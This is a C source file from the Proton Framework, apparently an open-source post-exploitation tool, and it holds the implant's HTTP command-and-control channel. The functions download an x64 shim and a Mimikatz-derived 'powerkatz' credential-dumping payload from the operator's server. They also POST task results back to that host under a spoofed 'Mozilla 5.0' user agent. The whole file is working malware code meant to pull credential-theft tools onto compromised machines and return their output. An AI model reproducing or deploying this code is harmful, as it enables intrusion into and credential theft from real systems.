//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

#include "proton_net.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

BOOL proton_http_get_x64_shim(proton_shim_parsed *parsed, char **data, LPDWORD dwSize)
{
	char header[160] = { 0 };
	sprintf(header, "%s: %s", parsed->uuidHeader, parsed->uuidShimx64);

	return proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
}

BOOL proton_http_get_powerkatz(proton_shim_parsed *parsed, char **data, LPDWORD dwSize)
{
	char header[160] = { 0 };
	sprintf(header, "%s: %s", parsed->uuidHeader, sizeof(void*) == 4 ? parsed->uuidMimix86 : parsed->uuidMimix64);

	return proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
}


BOOL proton_http_report_error(proton_shim_parsed *parsed, char *work)
{
	return proton_http_report_work(parsed, work);
}

BOOL proton_http_report_work(proton_shim_parsed *parsed, char *work)
{
	BOOL ret = FALSE;
	char *data;
	DWORD dwSize;

	//MessageBoxA(NULL, work, "DEBUG", MB_OK);
	ret = proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, NULL, 0, work, strlen(work), &data, &dwSize);

	free(data);
	return ret;
}

BOOL proton_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;

	BOOL ret = FALSE;
	do
	{
		hIntSession = InternetOpenA("Mozilla 5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		if (NULL == hIntSession)
			break;

		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);

		if (NULL == hHttpSession)
			break;

		dwFlags |= INTERNET_FLAG_RELOAD;
		if (secure)
			dwFlags |= INTERNET_FLAG_SECURE;

		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);

		if (NULL == hHttpRequest)
			break;

		if (!HttpSendRequestA(hHttpRequest, szHeaders, (DWORD)nHeaderSize, (LPVOID)postData, (DWORD)nPostDataSize))
			break;

		CHAR szBuffer[1024];
		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;

		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		*data = output;
		*dwDataSize = dwTotalBytes;

		ret = TRUE;
	} while (0);

	if (hHttpRequest)
		InternetCloseHandle(hHttpRequest);

	if (hHttpSession)
		InternetCloseHandle(hHttpSession);

	if (hIntSession)
		InternetCloseHandle(hIntSession);

	return ret;
}
